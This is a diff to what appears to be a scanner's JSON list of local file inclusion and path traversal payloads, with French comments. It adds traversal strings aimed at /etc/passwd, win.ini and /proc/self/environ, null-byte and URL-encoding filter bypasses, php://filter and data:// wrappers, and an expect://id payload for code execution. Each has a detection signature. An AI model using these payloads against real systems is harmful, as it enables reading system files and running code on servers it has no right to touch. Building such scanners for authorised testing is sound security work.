@@ -6,17 +6,24 @@
       {"payload": "../../../../etc/passwd",          "signature": "root:[x*]:0:0", "confidence_hint": 95},
       {"payload": "../../../../../../etc/passwd",    "signature": "root:[x*]:0:0", "confidence_hint": 95},
       {"payload": "/etc/passwd",                     "signature": "root:[x*]:0:0", "confidence_hint": 80},
-      {"payload": "....//....//....//etc/passwd",    "signature": "root:[x*]:0:0", "confidence_hint": 85, "description": "Double-encoding bypass"}
+      {"payload": "....//....//....//etc/passwd",    "signature": "root:[x*]:0:0", "confidence_hint": 85, "description": "Double-encoding bypass", "depth": "extended"},
+      {"payload": "../../../../etc/passwd%00",       "signature": "root:[x*]:0:0", "confidence_hint": 60, "description": "Null byte historique (PHP < 5.3.4)", "depth": "aggressive"},
+      {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "signature": "root:[x*]:0:0", "confidence_hint": 80, "description": "URL-encoding des séparateurs (bypass filtre naïf)", "depth": "extended"},
+      {"payload": "../../../../proc/self/environ",   "signature": "DOCUMENT_ROOT=", "confidence_hint": 70, "description": "Variables d'environnement du process (log/env poisoning)", "depth": "aggressive"}
     ],
     "windows": [
-      {"payload": "..\\..\\..\\..\\windows\\win.ini",    "signature": "\\[fonts\\]", "confidence_hint": 95},
-      {"payload": "../../../../../../windows/win.ini",   "signature": "\\[fonts\\]", "confidence_hint": 95},
-      {"payload": "C:\\Windows\\win.ini",                "signature": "\\[fonts\\]", "confidence_hint": 80}
+      {"payload": "..\\..\\..\\..\\windows\\win.ini",    "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 95},
+      {"payload": "../../../../../../windows/win.ini",   "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 95},
+      {"payload": "C:\\Windows\\win.ini",                "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 80},
+      {"payload": "..\\..\\..\\..\\windows\\win.ini%00",  "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 55, "description": "Null byte historique (PHP < 5.3.4)", "depth": "aggressive"},
+      {"payload": "..%5c..%5c..%5c..%5cwindows%5cwin.ini", "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 80, "description": "URL-encoding du séparateur \\ (bypass filtre naïf)", "depth": "extended"}
     ],
     "php_wrappers": [
-      {"payload": "php://filter/convert.base64-encode/resource=index", "signature": "PD9waHA|^\\?php", "confidence_hint": 90, "description": "Read PHP source as base64"},
+      {"payload": "php://filter/convert.base64-encode/resource=index", "signature": "PD9waHA|\\?php|cGhwLw==", "confidence_hint": 90, "description": "Read PHP source as base64"},
       {"payload": "php://input",                                       "signature": "",          "confidence_hint": 70, "description": "Read POST body as code"},
-      {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "signature": "phpinfo", "confidence_hint": 85, "description": "Inline PHP"}
+      {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "signature": "phpinfo", "confidence_hint": 85, "description": "Inline PHP", "depth": "extended"},
+      {"payload": "php://filter/convert.base64-encode/resource=../../../../etc/passwd", "signature": "cm9vdDo", "confidence_hint": 85, "description": "Wrapper combiné à une traversée — lit un fichier arbitraire en base64", "depth": "extended"},
+      {"payload": "expect://id", "signature": "uid=", "confidence_hint": 60, "description": "RCE directe si l'extension expect est chargée (LFI2RCE)", "depth": "aggressive"}
     ]
   }
 }
